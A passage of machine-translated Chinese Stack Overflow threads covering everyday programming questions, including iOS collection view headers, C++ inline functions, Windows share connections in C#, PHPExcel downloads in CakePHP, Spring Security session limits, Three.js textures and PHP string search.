
string[] readLines = File.ReadAllLines(path);

IEnumerable<string> lines = readLines.Where(i => i.Contains("BILL")); 
```

您现在可以设置一些调试点并验证：

1.  `readLines`包含行列表。
2.  `lines`仅包含其中包含的那些行`BILL`。

# objective-c - 顶部和侧面的 UICollectionView 浮动标题

> ID：15159559
> 
> 赞同：6
> 
> 时间：2013-03-01T14:02:19.753
> 
> 标签：objective-c, xcode, header, uicollectionview, supplementary

您如何在 a 中实现标头`UICollectionView`？我知道您可以放入补充视图，但我不知道如何使它们“浮动”在类似标题的部分上方`UITableView`。

这是我的情况：我有一个`collectionView`以网格格式布置的单元格。您可以水平和垂直滚动。我想在顶部有一个标题，这样当您水平滚动时，它会随之水平滚动，但不会垂直滚动。我也想在左侧有同样的东西，它垂直滚动`collectionView`但不水平滚动。用补充观点来实现这一点是正确的方法吗？

我正在寻找的最终功能类似于 iOS 上的 Numbers 电子表格应用程序。

在此先感谢您的帮助！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2016-05-16T21:09:01.380

iOS9 更新：

```
let flow = collectionView.collectionViewLayout as! UICollectionViewFlowLayout
flow.sectionHeadersPinToVisibleBounds = true 
```

把它传过去。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-03-01T15:02:16.857

编辑：正如评论中提到的，这个答案是有效的，但不适用于多个部分。请参阅此博客以获得更好的解决方案： http: [//blog.radi.ws/post/32905838158/sticky-headers-for-uicollectionview-using#notes](http://blog.radi.ws/post/32905838158/sticky-headers-for-uicollectionview-using#notes)

* * *

您需要在布局中指定该行为：

```
- (NSArray *)layoutAttributesForElementsInRect:(CGRect)rect
{
  NSMutableArray* attributesArray = [[super layoutAttributesForElementsInRect:rect] mutableCopy];

  BOOL headerVisible = NO;

  for (UICollectionViewLayoutAttributes *attributes in attributesArray) {
    if ([attributes.representedElementKind isEqualToString:UICollectionElementKindSectionHeader]) {
      headerVisible = YES;
      attributes.frame = CGRectMake(self.collectionView.contentOffset.x, 0, self.headerReferenceSize.width, self.headerReferenceSize.height);
      attributes.alpha = HEADER_ALPHA;
      attributes.zIndex = 2;
    }
  }

  if (!headerVisible) {
    UICollectionViewLayoutAttributes *attributes = [self layoutAttributesForSupplementaryViewOfKind:UICollectionElementKindSectionHeader
                                                                                        atIndexPath:[NSIndexPath
                                                                                                     indexPathForItem:0
                                                                                                     inSection:0]];
    [attributesArray addObject:attributes];
  }

  return attributesArray;
} 
```

# javascript - 如何将 svg 元素的高度/宽度大小转换为像素

> ID：15159560
> 
> 赞同：1
> 
> 时间：2013-03-01T14:02:22.007
> 
> 标签：javascript, jquery, graphics, svg, coordinate-systems

我有一些 svg 元素，我希望它们的高度和宽度以像素为单位。这个怎么做？

```
<rect height="200" width="400" fill="red" stroke="1"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:39:54.773

矢量格式的测量值通常与最终渲染它们的“窗口”或“查看器”的大小相关。在不知道视口大小（以像素为单位）的情况下，它们可以无限大或无限小。如果您确实有视口大小并且元素没有被任何东西转换，那么您需要查看元素相对于视口的位置，确保其完全显示，然后您可以计算其渲染大小。但是，请注意如果它被部分或完全“关闭屏幕”而从显示中剪裁出来。

# c++ - 静态库。导入和导出内联函数

> ID：15159561
> 
> 赞同：3
> 
> 时间：2013-03-01T14:02:25.200
> 
> 标签：c++, linker, static-libraries, inline

这个问题是在我实现我的静态库时出现的。
我想*检查我的猜测并获得有关*在静态库中使用内联函数的信息。

*   **我的猜测是静态库的实施者无法在他的库中导出内联函数**
    由于内联语句是由编译器通过放置表示操作的低级命令来实现的（是否使函数内联取决于编译器）在代码段的函数体中，这样操作就不会放在导出/导入表中，因此不能被链接器处理，因此不能被库管理员包含到静态库所在的应用程序代码中被附上。我的逻辑对吗？

*   **我想将函数作为内联导入是允许的，但我想知道它是如何实现的**，因为这是编译器的责任，但在链接状态下只有图书馆员，所以这意味着它必须采取一些行动才能使函数内联。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T14:13:51.910

1.  是的，内联函数通常放置在标头中，因此无论在何处使用该函数，编译器都可以直接看到函数体。这让编译器可以评估是否在任何特定实例中为函数生成内联代码。

2.  这基本上不会出现 - “内联函数应在使用它的每个翻译单元中定义。” （§3.2/3）。这意味着如果编译器要内联生成函数，则进入库的是目标代码，其中包括该函数代码的内联扩展。由于函数可能不会在每次使用时都内联扩展，因此库中通常还会有函数的定义，但该定义将（至少主要）像普通函数一样使用，而不是内联扩展。

链接器也可以生成代码。无论一个函数是否是`inline`语言标准的函数，并且是在与使用它的翻译单元相同或不同的翻译单元中定义的，链接器无论如何都可以为其生成内联代码。

长话短说，`inline`就函数代码是否内联生成而言，关键字对典型编译器的影响很小或没有影响。主要（如果不是唯一的）影响是它改变了单一定义规则——内联意味着同一函数的多个（相同）定义可以存在而不会引起问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T14:08:51.307

您了解关键字`inline`吗 - 您同样可以使用替换。

如果选择用实际代码替换函数调用，则内联函数启用编译 - 无需导出/导入。它在头文件中定义。任何使用目标代码的东西都需要该头代码，因此编译器会将函数调用替换为实际代码。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-28T12:06:27.600

`__declspec(dllexport) inline`在 Visual C++ 上，您可以使用 Microsoft 特定的行为，并使用或导出/导入内联函数`extern inline`。请注意，这是 Microsoft 特定的行为，如果您的目标不是 Windows 并且根本不关心可移植性，您可以考虑它。

# c# - 阻止允许被禁止用户访问共享文件夹的 WNetAddConnection2 类

> ID：15159564
> 
> 赞同：1
> 
> 时间：2013-03-01T14:02:28.133
> 
> 标签：c#, windows, networking, directory, shared

我开发了 C# windows 应用程序。操作系统是 Windows 7

**要求：**是使用具有`WNetAddConnection2`类凭据的代码访问网络共享文件夹“测试”。

**限制：**是部分用户可以访问此共享文件夹“Test”，但对于其他用户，设置了“拒绝”共享权限。

在代码中`WNetAddConnection2`验证错误的用户名/密码，它会给我错误。

例如

来自 LAN 的“用户 A”正在尝试使用 访问共享文件夹“测试” `run command`，他无法访问“访问被拒绝”，因为他没有权限。

**但问题是 WNetAddConnection2 类允许“用户 A”成功建立网络连接。感染“WNetAddConnection2 允许来自域的所有用户”。类正在验证访问权限。**

代码是

```
private void btnValidate_Click(object sender, EventArgs e)
     {
         bool valid = false;
         try
         {              
             NetworkCredential NC = new NetworkCredential(txtUserName.Text.Trim(), txtPassword.Text.Trim());  

         }
         catch (Exception ex)
         {
             MessageBox.Show(ex.Message.ToString());
         }
     }

public class NetworkConnection : IDisposable
 {
     string _networkName;
     uint dwFlags;
     public NetworkConnection(string networkName, NetworkCredential credentials)
     {
         _networkName = networkName;

         var netResource = new NetResource()
         {
             Scope = ResourceScope.GlobalNetwork,
             ResourceType = ResourceType.Disk,
             DisplayType = ResourceDisplaytype.Share,
             RemoteName = networkName
         };

         var userName = string.IsNullOrEmpty(credentials.Domain)
             ? credentials.UserName
             : string.Format(@"{0}\{1}", credentials.Domain, credentials.UserName);

         var result = WNetAddConnection2(netResource,"","",0x00000008 | 0x00000010);

         if (result != 0)
         {
             string strErrMsg = "";
             if (result == 67)
             {
                 strErrMsg = "The network name cannot be found.";
             }
             if (result == 86)
             {
                 strErrMsg = "Invalid UserName or Password for ProBiz server";
             }
             else if (result == 1219)
             {
                 strErrMsg = "Multiple connections to a server or shared resource by the same user, using more than one user name, are not allowed.Close application to Disconnect all previous connections to the server or shared resource and try again.";
             }

             throw new Win32Exception(result, "Error connecting to "+networkName+" remote share.Error Code:"+result.ToString()+"."+strErrMsg);
         }
         else
         {
             MessageBox.Show("Test connection is successful for "+ networkName);
         }
     }

     ~NetworkConnection()
     {
         Dispose(false);
     }

     public void Dispose()
     {
         Dispose(true);
         GC.SuppressFinalize(this);
     }

     protected virtual void Dispose(bool disposing)
     {
         WNetCancelConnection2(_networkName,  1, true  );
         var command = "NET USE  /delete *";
         ExecuteCommand(command, 5000);

     }
     public static int ExecuteCommand(string command, int timeout)
     {
         var processInfo = new ProcessStartInfo("cmd.exe", "/C " + command)
         {
             CreateNoWindow = true,
             UseShellExecute = false,
             WorkingDirectory = "C:\\",
         };

         var process = Process.Start(processInfo);
         process.WaitForExit(timeout);
         var exitCode = process.ExitCode;
         process.Close();
         return exitCode;
     } 

     [DllImport("mpr.dll")]
     private static extern int WNetAddConnection2(NetResource netResource,
         string password, string username, int flags);

     [DllImport("mpr.dll")]
     private static extern int WNetCancelConnection2(string name, int flags,
         bool force);
 }

 [StructLayout(LayoutKind.Sequential)]
 public class NetResource
 {
     public ResourceScope Scope;
     public ResourceType ResourceType;
     public ResourceDisplaytype DisplayType;
     public int Usage;
     public string LocalName;
     public string RemoteName;
     public string Comment;
     public string Provider;
 }

 public enum ResourceScope : int
 {
     Connected = 1,
     GlobalNetwork,
     Remembered,
     Recent,
     Context
 };

 public enum ResourceType : int
 {
     Any = 0,
     Disk = 1,
     Print = 2,
     Reserved = 8,
 }

 public enum ResourceDisplaytype : int
 {
     Generic = 0x0,
     Domain = 0x01,
     Server = 0x02,
     Share = 0x03,
     File = 0x04,
     Group = 0x05,
     Network = 0x06,
     Root = 0x07,
     Shareadmin = 0x08,
     Directory = 0x09,
     Tree = 0x0a,
     Ndscontainer = 0x0b
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-09-03T21:32:22.990

按照设计，连接到共享需要访问*共享*- 它*不需要*访问共享的根目录。

通过运行框打开共享会打开共享的根目录，因此它至少需要对该目录和共享的读取权限。相比之下，WNetAddConnection2() API 只需要访问共享。

它必须以这种方式工作，因为有时需要让某人只访问某些子目录，而不是根目录。如果连接到共享需要访问根目录，这是不可能的。

连接到共享后，您可以通过尝试枚举文件来测试对根目录的访问。如果您收到拒绝访问异常，则用户无权访问。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2015-09-03T08:07:18.760

当我以前在 IIS 7.5 中部署我的 C# 项目时，我遇到了同样的问题，但是当我删除代码的注销过程时，这真是太棒了。. .

我的意思是删除功能`LogoutFromShare(ip,folder)`服务器目录。

我只用这个`LoginToOtherPC(ip, usr, pwd, folder)`。

# coffeescript - 这行 CoffeeScript 是什么意思？

> ID：15159570
> 
> 赞同：1
> 
> 时间：2013-03-01T14:02:54.873
> 
> 标签：coffeescript

我正在阅读 Journo 的[源代码](https://github.com/jashkenas/journo/blob/master/journo.litcoffee)，偶然发现了这行代码：

```
markdown  = _.template(source.toString()) variables 
```

在这里做什么`variables`？是`_.template(source.toString()) variables`有效的 stntax 吗？

这是包装该行代码的函数：

```
Journo.render = (post, source) ->
      catchErrors ->
        do loadLayout
        source or= fs.readFileSync postPath post
        variables = renderVariables post
        markdown  = _.template(source.toString()) variables
        title     = detectTitle markdown
        content   = marked.parser marked.lexer markdown
        shared.layout _.extend variables, {title, content} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:05:58.263

是的，它是有效的。调用函数时，CoffeeScript 中的括号是可选的（有时），因此它获取结果`template`并使用参数调用它。它编译成这个 JavaScript：

```
_.template(source.toString())(variables); 
```

从 CoffeeScript[文档](http://coffeescript.org/#language)：

> 如果要传递参数，则不需要使用括号来调用函数。隐式调用向前换行到行或块表达式的末尾。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:08:14.620

`_.template`编译由 指定的模板`source.toString()`。模板是一个函数，然后被调用。 `variables`是该函数的参数（就像`postPath post`的参数一样`fs.readFileSync`）。

另请参阅[_.template的文档](http://underscorejs.org/#template)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-05-08T04:27:06.827

这个问题得到了很好的回答，但是为了帮助 OP 处理未来的咖啡特技，分析这些公案的好方法是

1.  访问 coffeescript.org 网站
2.  点击“尝试coffeescript”
3.  将拼图剪切/粘贴到咖啡脚本部分
4.  答对了！您会看到生成的 javascript。

我承认有时会为咖啡脚本感到困惑，这是绝对的晶圆厂 .. 并且可以避免头痛。

# php - cakePHP - PHP EXCEL 保存为 .html

> ID：15159571
> 
> 赞同：2
> 
> 时间：2013-03-01T14:02:58.460
> 
> 标签：php, cakephp, save, phpexcel, cakephp-2.x

我在我的 CakePHP 应用程序中实现了 PHPExcel，这是我的助手：

```
<?php
App::uses('AppHelper', 'Helper');

/**
 * Helper for working with PHPExcel class.
 * PHPExcel has to be in the vendors directory.
 */

class PhpExcelHelper extends AppHelper {
  /**
   * Instance of PHPExcel class
   * @var object
   */
  public $xls;
  /**
   * Pointer to actual row
   * @var int
   */
  protected $row = 1;
  /**
   * Internal table params 
   * @var array
   */
  protected $tableParams;

  /**
   * Constructor
   */
  public function __construct(View $view, $settings = array()) {
        parent::__construct($view, $settings);
    }

  /**
   * Create new worksheet
   */
  public function createWorksheet() {
    $this->loadEssentials();
    $this->xls = new PHPExcel();
  }

  /**
   * Create new worksheet from existing file
   */
  public function loadWorksheet($path) {
    $this->loadEssentials();
    $this->xls = PHPExcel_IOFactory::load($path);
  }

  /**
   * Set row pointer
   */
  public function setRow($to) {
    $this->row = (int)$to;
  }

  /**
   * Set default font
   */
  public function setDefaultFont($name, $size) {
    $this->xls->getDefaultStyle()->getFont()->setName($name);
    $this->xls->getDefaultStyle()->getFont()->setSize($size);
  }

  /**
   * Start table
   * inserts table header and sets table params
   * Possible keys for data:
   *  label   - table heading
   *  width - "auto" or units
   *  filter  - true to set excel filter for column
   *  wrap  - true to wrap text in column
   * Possible keys for params:
   *  offset  - column offset (numeric or text)
   *  font  - font name
   *  size  - font size
   *  bold  - true for bold text
   *  italic  - true for italic text
   *  
   */
  public function addTableHeader($data, $params = array()) {
    // offset
    if (array_key_exists('offset', $params))
      $offset = is_numeric($params['offset']) ? (int)$params['offset'] : PHPExcel_Cell::columnIndexFromString($params['offset']);
    // font name
    if (array_key_exists('font', $params))
      $this->xls->getActiveSheet()->getStyle($this->row)->getFont()->setName($params['font_name']);
    // font size
    if (array_key_exists('size', $params))
      $this->xls->getActiveSheet()->getStyle($this->row)->getFont()->setSize($params['font_size']);
    // bold
    if (array_key_exists('bold', $params))
      $this->xls->getActiveSheet()->getStyle($this->row)->getFont()->setBold($params['bold']);
    // italic
    if (array_key_exists('italic', $params))
      $this->xls->getActiveSheet()->getStyle($this->row)->getFont()->setItalic($params['italic']);

    // set internal params that need to be processed after data are inserted
    $this->tableParams = array(
      'header_row' => $this->row,
      'offset' => $offset,
      'row_count' => 0,
      'auto_width' => array(),
      'filter' => array(),
      'wrap' => array()
    );

    foreach ($data as $d) {
      // set label
      $this->xls->getActiveSheet()->setCellValueByColumnAndRow($offset, $this->row, $d['label']);
      // set width
      if (array_key_exists('width', $d)) {
        if ($d['width'] == 'auto')
          $this->tableParams['auto_width'][] = $offset;
        else
          $this->xls->getActiveSheet()->getColumnDimensionByColumn($offset)->setWidth((float)$d['width']);
      }
      // filter
      if (array_key_exists('filter', $d) && $d['filter'])
        $this->tableParams['filter'][] = $offset;
      // wrap
      if (array_key_exists('wrap', $d) && $d['wrap'])
        $this->tableParams['wrap'][] = $offset;

      $offset++;
    }
    $this->row++; 
  }

  /**
   * Write array of data to actual row
   */
  public function addTableRow($data) {
    $offset = $this->tableParams['offset'];

    foreach ($data as $d) {
      $this->xls->getActiveSheet()->setCellValueByColumnAndRow($offset++, $this->row, $d);
    }
    $this->row++;
    $this->tableParams['row_count']++;
  }

  /**
   * End table
   * sets params and styles that required data to be inserted
   */
  public function addTableFooter() {
    // auto width
    foreach ($this->tableParams['auto_width'] as $col)
      $this->xls->getActiveSheet()->getColumnDimensionByColumn($col)->setAutoSize(true);
    // filter (has to be set for whole range)
    if (count($this->tableParams['filter']))
      $this->xls->getActiveSheet()->setAutoFilter(PHPExcel_Cell::stringFromColumnIndex($this->tableParams['filter'][0]).($this->tableParams['header_row']).':'.PHPExcel_Cell::stringFromColumnIndex($this->tableParams['filter'][count($this->tableParams['filter']) - 1]).($this->tableParams['header_row'] + $this->tableParams['row_count']));
    // wrap
    foreach ($this->tableParams['wrap'] as $col)
      $this->xls->getActiveSheet()->getStyle(PHPExcel_Cell::stringFromColumnIndex($col).($this->tableParams['header_row'] + 1).':'.PHPExcel_Cell::stringFromColumnIndex($col).($this->tableParams['header_row'] + $this->tableParams['row_count']))->getAlignment()->setWrapText(true);
  }

  /**
   * Write array of data to actual row starting from column defined by offset
   * Offset can be textual or numeric representation
   */
  public function addData($data, $offset = 0) {
    // solve textual representation
    if (!is_numeric($offset))
      $offset = PHPExcel_Cell::columnIndexFromString($offset);

    foreach ($data as $d) {
      $this->xls->getActiveSheet()->setCellValueByColumnAndRow($offset++, $this->row, $d);
    }
    $this->row++;
  }

  /**
   * Output file to browser
   */
  public function output($filename = 'export.xlsx') {
    // set layout
    $this->View->layout = '';
    // headers
    header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
    header('Content-Disposition: attachment;filename="'.$filename.'"');
    header('Cache-Control: max-age=0');
    // writer
    $objWriter = PHPExcel_IOFactory::createWriter($this->xls, 'Excel2007');
    $objWriter->save('php://output');
    // clear memory
    $this->xls->disconnectWorksheets();
  }

  /**
   * Load vendor classes
   */
  protected function loadEssentials() {
    // load vendor class
    App::import('Vendor', 'PHPExcel/Classes/PHPExcel');
    if (!class_exists('PHPExcel')) {
      throw new CakeException('Vendor class PHPExcel not found!');
    }
  }
} 
```

这是我的控制器：

```
 public $helpers = array('PhpExcel');
    ...
    public function excel() {
        $this->set('participants', $this->Participant->find('all'));
    } 
```

这是我的看法：

```
<?php
    $this->PhpExcel->createWorksheet();
    $this->PhpExcel->setDefaultFont('Calibri', 12);

    // define table cells
    $table = array(
        array('label' => __('id'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Förnamn'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Efternamn'), 'width' => 'auto', 'filter' => true),
        array('label' => __('E-postadress'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Mobiltelefon'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Specialkost'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Enhet'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Seminarium'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Utanför Stockholm'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Dela rum'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Transfer'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Bara där på dagen'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Låt'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Lärare som blivit hyllad'), 'width' => 'auto', 'filter' => true),
        array('label' => __('Kommentar'), 'width' => 'auto', 'filter' => true),
    );

    // heading
    $this->PhpExcel->addTableHeader($table, array('name' => 'Cambria', 'bold' => true));

    foreach ($participants as $d) {
        $this->PhpExcel->addTableRow(array(
            $d['Participant']['id'],
            $d['Participant']['f_name'],
            $d['Participant']['l_name'],
            $d['Participant']['email'],
            $d['Participant']['mobile_phone'],
            $d['Participant']['special'],
            $d['Participant']['school'],
            $d['Participant']['seminarium_id'],
            $d['Participant']['outside_sthlm'],
            $d['Participant']['share_room'],
            $d['Participant']['transfer'],
            $d['Participant']['only_day'],
            $d['Participant']['song'],
            $d['Participant']['teacher'],
            $d['Participant']['comments']
        ));
    }

    $this->PhpExcel->addTableFooter();
    $this->PhpExcel->output();
    $this->PhpExcel->exit();
?> 
```

当我尝试在 Firefox 中下载它时，我得到了正确的文件扩展名 xlsx 但是当尝试使用 safari 下载时它给了我 report.xlsx.html ？除非您将其重命名为report.xlsx，否则该文件将变得无用，怎么会？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T22:05:43.343

首先，您应该将“布局”设置为“假”，以防止在您网站的默认 (HTML) 布局中加载视图。

还将响应类型设置为 Excel 的类型（正如其他人提到的那样。您可以通过响应对象（[http://book.cakephp.org/2.0/en/controllers/request-response.html#dealing -with-content-types](http://book.cakephp.org/2.0/en/controllers/request-response.html#dealing-with-content-types) )

最后，不要`exit();`在你的助手中。如果您没有在布局中渲染视图，则不必在输出结果后退出

在您的控制器中；

```
public $helpers = array('PhpExcel');
...
public function excel() {
    // disable the layout
    $this->layout = false;

    // Add/define XLS contenttype
    $this->response->type(array('xls' => 'application/vnd.ms-excel'));

    // Set the response Content-Type to xls
    $this->response->type('xls');

    $this->set('participants', $this->Participant->find('all'));
} 
```

**note** 正如 Mark Ba​​ker 所说，XLS 和 XLSX 使用不同的 mime 类型，我的示例使用“经典”XLS 的 mime 类型，如果您要输出 XLSX，请相应地修改 mime 类型

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T21:07:02.877

我在[另一个网站](http://useranswer.com/answer/phpexcel-in-cakephp-error-excel-file-incompatible-or-corrupted/)上找到的一个可能的解决方案说要添加

```
$this->render(false); 
```

到您的控制器，以防止 CakePHP 发送可能覆盖您自己的标头/响应

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-12-27T12:35:43.557

您正在跳过 CakePHP 提供的用于分派请求的所有机制。遵循将[字符串作为文件发送](https://book.cakephp.org/2.0/en/controllers/request-response.html#sending-a-string-as-file)的指南：

*   要生成适当的`Content-Type`标头：

    ```
    $this->response->type('xlsx'); 
    ```

    （两者`xls`和`xlsx`都已在 中别名`CakeResponse::$_mimeTypes`。）

*   要强制下载并分配名称：

    ```
    $this->response->download($filename); 
    ```

    或者，只建议一个名称，但让用户选择：

    ```
    $this->response->header('Content-Disposition', 'inline; filename="' . $filename . '"'); 
    ```

*   发送字符串：

    ```
    $this->response->body('data comes here'); 
    ```

*   为了防止控制器尝试渲染视图：

    ```
    return $this->response; 
    ```

不过，有一个小故障。如果您使用`'php://output'`文件名，那么 PHPExcel 将发出输出，CakePHP 将不再发送 HTTP 标头以避免警告消息。为避免您需要输出缓冲区函数来保存生成的输出：

```
$objWriter = PHPExcel_IOFactory::createWriter($this->xls, 'Excel2007');
ob_start();
$objWriter->save('php://output');
$this->response->body(ob_get_clean()); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T14:10:54.410

你可以试试

```
header('Content-type: application/ms-excel'); 
```

# spring - SpringSecurity - 并发会话不起作用

> ID：15159574
> 
> 赞同：1
> 
> 时间：2013-03-01T14:03:06.333
> 
> 标签：spring, spring-security

我正在通过 Spring Security 实现对并发会话的控制。

但是，当我通过具有用户的 Chrome 登录系统并在具有相同用户的 FireFox 上登录系统时，不会显示错误消息。我的控制台也不例外。

我的 web.xml ：

```
<!-- ... -->

<listener>
  <listener-class>
    org.springframework.security.web.session.HttpSessionEventPublisher
  </listener-class>
</listener>

<!-- .... --> 
```

我的 security.xml ：

```
 <-- .... -->

   <security:http auto-config="true" use-expressions="true">

    <security:intercept-url pattern="/**" access="isAuthenticated()" />

    <security:form-login login-page="/login" default-target-url="/home" 
                         authentication-failure-url="/login?logout=true" 
                         authentication-success-handler-ref="authenticationSuccessHandler"
                         authentication-failure-handler-ref="authenticationFailureHandler"/>

    <security:logout logout-url="/j_spring_security_logout" invalidate-session="true" success-handler-ref="logoutHandler"/>

    <security:custom-filter ref="concurrencyFilter" position="CONCURRENT_SESSION_FILTER"/>
    <security:session-management session-authentication-strategy-ref="concurrentSessionManager" session-authentication-error-url="/login?msg=SessionError"/>

</security:http>

<bean id="authenticationFilter" class="org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter">
        <property name="authenticationManager" ref="authenticationManager"/>
        <property name="sessionAuthenticationStrategy" ref="concurrentSessionManager"/>
</bean>

<!-- Authentication Manager -->
<security:authentication-manager alias="authenticationManager">
    <!-- Custom Authentication provider -->
    <security:authentication-provider ref="hemisphereAuthenticationProvider"/>
</security:authentication-manager>

<bean id="sessionRegistry" class="org.springframework.security.core.session.SessionRegistryImpl" />  

<bean id="concurrencyFilter" class="org.springframework.security.web.session.ConcurrentSessionFilter">
    <property name="sessionRegistry" ref="sessionRegistry"/>
    <property name="expiredUrl" value="/login?msg=SessionError" />
</bean> 

<bean id="concurrentSessionManager" class="org.springframework.security.web.authentication.session.ConcurrentSessionControlStrategy">
    <property name="maximumSessions" value="1"/>
    <property name="exceptionIfMaximumExceeded" value="true" />
    <constructor-arg name="sessionRegistry" ref="sessionRegistry" />
</bean>

<bean id="hemisphereAuthenticationProvider" class="security.HemisphereAuthenticationProvider">
    <property name="userDetailsService" ref="userDetailService"/>
</bean>

<bean id="authenticationSuccessHandler" class="security.HemisphereAuthenticationSuccessHandler">
    <property name="defaultTargetUrl" value="/home" />
    <property name="alwaysUseDefaultTargetUrl" value="no" />
</bean>

<bean id="authenticationFailureHandler" class="security.HemisphereAuthenticationFailureHandler">
    <property name="defaultFailureUrl" value="/login" />
</bean>

<bean id="logoutHandler" class="security.HemisphereLogoutHandler"/> 
```

我究竟做错了什么？

感谢您的关注！

# ascii - 将 VB.NET NumericKeyPress 事件代码修改为 C++

> ID：15159576
> 
> 赞同：0
> 
> 时间：2013-03-01T14:03:19.503
> 
> 标签：ascii, keypress, beep

有人可以为我修改吗？

```
Private Sub NumericKeyPress(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox1.KeyPress
        If e.KeyChar = Chr(Keys.Back) Then
        Else
            If Not Char.IsDigit(e.KeyChar) Then
                e.Handled = True
                Beep()
            Else
                If Len(TextBox1.Text) > 0 Then
                    If Val(TextBox1.Text) > 105097565 Then
                        e.Handled = True
                        Beep()
                    End If
              End If
                    End If
         End If
    End Sub 
```

或者告诉我是怎么回事： 1.NumericKeyPress 事件？2.e.KeyChar怎么说？3.IsDigit怎么说？4.Chr（ASCII码）怎么说？5.如何处理e.Key？6.如何系统提示音？

我试过：

```
private: System::Void textBox1_KeyPress( Object^ sender, System::Windows::Forms::KeyPressEventArgs^ e )
                {
                    if(e->KeyChar == (Char)8)
                    {}
                    else 
                    {
                    if (!Char::IsDigit(e->KeyChar))
                    {
                    e->Handled = true;
                    }
                    else
                    {
                    if (textBox1->Text->Length > 0)
                    {
                    if (int::Parse(textBox1->Text) > 105097565)
                    {
                    e->Handled = true;
                    }
                    }
                    }
                    }
                 } 
```

但它没有用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T22:07:42.717

我添加了

```
this->textBox1->KeyPress += gcnew System::Windows::Forms::KeyPressEventHandler(this, &MyForm::textBox_KeyPress); 
```

到

```
#pragma region Windows Form Designer generated code
        void InitializeComponent(void) 
```

# three.js - 将导出的 Blender 纹理转换为使用 Three.JS

> ID：15159578
> 
> 赞同：3
> 
> 时间：2013-03-01T14:03:25.930
> 
> 标签：three.js, blender

我正在尝试获取已导出以正确显示的搅拌机模型，但看起来好像叶子的纹理没有正确混合为 alpha （尽管树干本身工作正常）。这是我所看到的： ![在此处输入图像描述](../Images/8f1cdaf646292f32e128c2d38ff97c84.png)

注意叶子是如何不正确地混叠的（即它应该看起来像一棵有叶子的树，而不是灰色的纸）。

在 Blender 中，树看起来不错，但有几个人告诉我，我的 alpha 看起来像是倒置的（我不完全确定这意味着什么）。我的猜测是，通过一些文件调整和转换，我可以让附加的图像正常工作。这是我得到的图像资源：

![在此处输入图像描述](../Images/b16abbd4c78e69ffc794bdb170a44f08.png)

![在此处输入图像描述](../Images/e51d08bb455dfbfe57f856342351622f.png)

![在此处输入图像描述](../Images/1c5b384492c3ea017259a889f37c0b2a.png)

![在此处输入图像描述](../Images/180f8e03932b77ec46b475042e719f5f.png)

![在此处输入图像描述](../Images/e97d070a01118853710f0fad8e8402a0.png)

我认为没有必要，但如果您想查看导出的 JSON，我已将其转储在这里： [https ://gist.github.com/funnylookinhat/5062061](https://gist.github.com/funnylookinhat/5062061)

我很确定问题出在橡树叶的黑白图像上——因为这是两种包装纹理之间的唯一区别。有没有办法可以使用它或转换它以使其正确应用于叶子层？

**更新**

我能够得到看起来大部分正确的东西（减去一些奇怪的透明度分层问题） - 但我很确定它没有正确完成......仍然会非常感谢任何帮助。

我在白色/黑色和绿色图像上添加了透明度，结果如下：

![在此处输入图像描述](../Images/4611f2119d6951a2bb42305e7501af6d.png)

![在此处输入图像描述](../Images/37ce45311fbf8859cee4edc2f337f194.png)

结果如下：

![在此处输入图像描述](../Images/907012fd7a9634ac7514ce6e9a99b0a4.png)

然后我在 JSON 中翻转了对它们两个的引用——结果如下：

![在此处输入图像描述](../Images/9a6db0ee525109e74b9ca79db6bf125d.png)

**我 99% 确定这没有按预期工作，看起来漫反射贴图无法正常工作......有什么建议吗？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T16:46:38.963

Three.js 没有遮罩纹理（黑白纹理），因此您需要将其烘焙到漫反射纹理的 alpha 通道中（因此使用 .png 格式，因为 .jpg 不支持 alpha - 正如您目前所做的那样）。

尽管漫反射 alpha 做得不好（叶子上有洞），但您的更新在正确的轨道上。这可以通过例如在 Gimp 中通过分解漫反射颜色通道然后使用添加的蒙版层作为 alpha 重新组合来完成（但请注意，假设白色是不透明的，黑色是透明的，因此可能需要反转）。

在材质中，完全不要使用蒙版纹理。叶子相互重叠也可能存在问题，这是一个难以解决的问题，因为透明度通常是 PITA。您可以尝试禁用材质`depthWrite`和/或使用`alphaTest`值（例如将其设置为 0.1）以获得不同类型的工件。

# php - strpos 用两个词找

> ID：15159582
> 
> 赞同：10
> 
> 时间：2013-03-01T14:03:48.783
> 
> 标签：php, strpos

我在stackoverflow上找到了这个例子：

```
if (strpos($a,'are') !== false) {
    echo 'true';
} 
```

但是我如何让它搜索两个词。我需要这样的东西：如果 $a 包含单词“are”或“be”或两者都回显“contains”；

我试过异或和||

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-01T14:06:03.090

只需分别检查这两个词并使用布尔运算`or`符来检查其中一个或两个是否包含在`$a`：

```
if (strpos($a,'are') !== false || strpos($a,'be') !== false) {
  echo "contains";
